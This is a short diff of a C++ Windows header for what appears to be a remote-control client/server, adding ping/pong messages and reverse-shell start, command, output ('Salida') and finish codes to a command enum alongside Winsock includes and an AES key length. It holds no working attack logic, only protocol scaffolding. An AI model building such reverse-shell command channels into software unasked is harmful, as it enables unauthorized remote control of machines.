@@ -1,5 +1,5 @@
-#ifndef _HEADERS
-#define _HEADERS 1
+#ifndef ___HEADERS
+#define ___HEADERS 1
 
 #include<ws2tcpip.h>
 #include<windows.h>
@@ -8,6 +8,7 @@
 #include<iostream>
 #include<mutex>
 #include<atomic>
+#include<map>
 #include<thread>
 #include<random>
 #include<fcntl.h>
@@ -22,8 +23,6 @@
 
 #define AES_KEY_LEN 32
 
-
-extern bool bSignalFlag;
 #define error() std::cout<<"Error["<<GetLastError()<<"]\n";
 #define error_2(x) std::cout<<"["<<x<<"]"<<"Error["<<GetLastError()<<"]\n";
 
@@ -34,11 +33,15 @@ typedef unsigned int u_int;
 
 namespace EnumComandos {
     enum Enum {
-        Reverse_Shell_Start = 500,
+        PONG = 499,
+        PING,
+        Reverse_Shell_Start,
         Reverse_Shell_Command,
         Reverse_Shell_Salida,
-        PING
+        Reverse_Shell_Finish
     };
 }
 
+
+ 
 #endif
